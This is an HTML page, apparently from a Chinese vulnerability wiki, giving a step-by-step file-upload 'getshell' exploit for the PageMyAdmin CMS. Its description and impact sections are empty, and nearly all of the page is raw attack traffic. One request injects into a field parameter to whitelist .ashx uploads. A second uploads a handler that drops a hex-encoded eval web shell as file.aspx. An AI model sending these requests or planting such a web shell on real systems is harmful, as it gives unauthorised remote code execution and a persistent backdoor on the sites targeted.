@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/PageMyAdmin/PageMyAdmin%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>PageMyAdmin文件上传getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "PageMyAdmin\u6587\u4ef6\u4e0a\u4f20getshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../PagerMaid-Pyro%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/PagerMaid-Pyro%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Frun_sh%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../PagerMaid-Pyro%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/PagerMaid-Pyro%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Frun_sh%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PagerMaid-Pyro后台管理系统run_sh接口存在未授权命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PageMyAdmin%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PageMyAdmin%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PageMyAdmin sql注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="pagemyadmingetshell">PageMyAdmin文件上传getshell<a class="headerlink" href="#pagemyadmingetshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>先set增加ashx白名单-&gt;</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/e/aspx/upload.aspx?a=pageadmin_cms</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">ASP.NET_SessionId=c53k11452napjc45ibfuaw55</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://www.0-sec.org/e/aspx/upload.aspx?a=pageadmin_cms</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">106</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">Keep-Alive</span>
+
+<span class="nt">submit</span><span class="o">=</span><span class="s">1</span><span class="p">&amp;</span><span class="nt">swf_upload</span><span class="o">=</span><span class="s">2</span><span class="p">&amp;</span><span class="nt">table</span><span class="o">=</span><span class="s">pa_field</span><span class="p">&amp;</span><span class="nt">field</span><span class="o">=</span><span class="s">file_ext</span><span class="o">=</span><span class="s">&quot;.jpg,.jpeg,.gif,.bmp,.ashx&quot;  where id</span><span class="o">=</span><span class="s">174 and max_num</span>
+</code></pre></div>
+
+<p>返回包</p>
+<div class="codehilite"><pre><span></span><code><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">private</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">72</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=utf-8</span>
+<span class="na">Server</span><span class="o">:</span> <span class="l">Microsoft-IIS/7.5</span>
+<span class="na">X-AspNet-Version</span><span class="o">:</span> <span class="l">2.0.50727</span>
+<span class="na">Date</span><span class="o">:</span> <span class="l">Sat, 13 Jul 2019 07:52:02 GMT</span>
+
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text/javascript&#39;</span><span class="p">&gt;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s1">&#39;?result=cs_error&#39;</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>第二步 在上传ashx-&gt;</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/e/aspx/upload.aspx</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundaryzBItOAbA8GrZ7s49</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">ASP.NET_SessionId=c53k11452napjc45ibfuaw55</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://www.0-sec.org/e/aspx/upload_p ... pic&amp;from=master</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">2318</span>
+
+
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;005.ashx&quot;
+Content-Type: image/jpeg
+
+&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt;
+using System;
+using System.Web;
+using System.IO;
+
+
+public class Handler : IHttpHandler
+{
+    public bool IsReusable
+    {
+        get
+        {
+            return false;
+        }
+    }
+    public void ProcessRequest(HttpContext context)
+    {
+        byte[] b={0x3C, 0x25, 0x40, 0x20, 0x50, 0x61, 0x67, 0x65, 0x20, 0x4C, 0x61, 0x6E, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3D, 0x22, 0x4A, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x22, 0x25, 0x3E, 0x3C, 0x25, 0x65, 0x76, 0x61, 0x6C, 0x28, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x2E, 0x49, 0x74, 0x65, 0x6D, 0x5B, 0x22, 0x70, 0x61, 0x73, 0x73, 0x22, 0x5D, 0x2C, 0x22, 0x75, 0x6E, 0x73, 0x61, 0x66, 0x65, 0x22, 0x29, 0x3B, 0x25, 0x3E};
+        try
+        {
+            File.WriteAllBytes(context.Server.MapPath(&quot;/e/upload/s1/article/file/&quot;)+&quot;/file.aspx&quot;,b);
+            context.Response.Write(&quot;oooooooookkkkkkkkk&quot;);
+        }
+        catch(Exception ex)
+        {
+            context.Response.Write(ex.Message);
+        }
+        context.Response.End();
+    }
+}
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;width&quot;
+
+400
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;height&quot;
+
+400
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;url&quot;
+
+
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;filesize&quot;
+
+0
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;username&quot;
+
+admin
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;sid&quot;
+
+1
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;type&quot;
+
+file
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;table&quot;
+
+article
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;field&quot;
+
+titlepic
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;from&quot;
+
+master
+------WebKitFormBoundaryzBItOAbA8GrZ7s49
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+1
+------WebKitFormBoundaryzBItOAbA8GrZ7s49--
+</code></pre></div>
+
+<p>发送第二步返回shell</p>
+<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=52096&amp;highlight=PageMyadmin">https://www.t00ls.net/viewthread.php?tid=52096&amp;highlight=PageMyadmin</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../PagerMaid-Pyro%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/PagerMaid-Pyro%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Frun_sh%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../PagerMaid-Pyro%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/PagerMaid-Pyro%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Frun_sh%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PagerMaid-Pyro后台管理系统run_sh接口存在未授权命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PageMyAdmin%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PageMyAdmin%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PageMyAdmin sql注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
